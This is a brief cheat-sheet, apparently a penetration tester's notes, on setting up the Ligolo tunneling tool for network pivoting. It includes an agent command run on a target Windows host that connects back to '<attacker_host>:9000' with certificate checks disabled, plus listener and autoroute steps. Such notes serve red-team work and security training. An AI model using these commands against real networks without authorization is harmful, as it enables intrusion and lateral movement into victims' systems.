# Ligolo

Setting up ligolo

* download latest update for windows/linux proxy/agent

Starting ligolo

```
sudo ./lin-proxy -selfcert -laddr 0.0.0.0:9000
```

Initiating connection from agent to proxy

```
.\win-agent.exe -connect <attacker_host>:9000 -ignore-cert
```

Adding Listener (for file transfer)

```
listener_add --addr 0.0.0.0:9999 --to 127.0.0.1:9999 --tcp
```

list sessions

```
session
-------------
1
```

autoroute (on ligolo)

```
autoroute
```

list ip interfaces&#x20;

```
ip a
```

clean up interfaces

```
sudo ip link delete <tktk>
```
